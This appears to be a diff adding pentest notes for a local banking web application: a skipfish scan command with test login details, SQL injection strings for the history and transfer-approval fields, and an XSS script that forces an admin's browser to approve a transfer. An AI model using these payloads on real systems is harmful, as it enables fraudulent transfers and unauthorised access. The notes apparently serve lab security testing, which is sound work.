@@ -1,0 +1,9 @@
+skipfish:
+skipfish -S complete.wl --auth-form http://127.0.0.1/bk/login.php --auth-verify-url http://127.0.0.1/bk/history.php --auth-user 1 --auth-user-field id --auth-pass-field password --auth-pass test -o /tmp/asd http://127.0.0.1/bk/index.php
+
+sqlinjection:
+historia: ' OR 1=1; --
+zatwierdzenie przelewu: tytul', '', 1); --
+
+xss:
+<script>var r=new XMLHttpRequest(); r.open(\'POST\', \'admin.php\', true);r.setRequestHeader(\'Content-type\', \'application/x-www-form-urlencoded\'); r.send(\'accept=4\');</script>
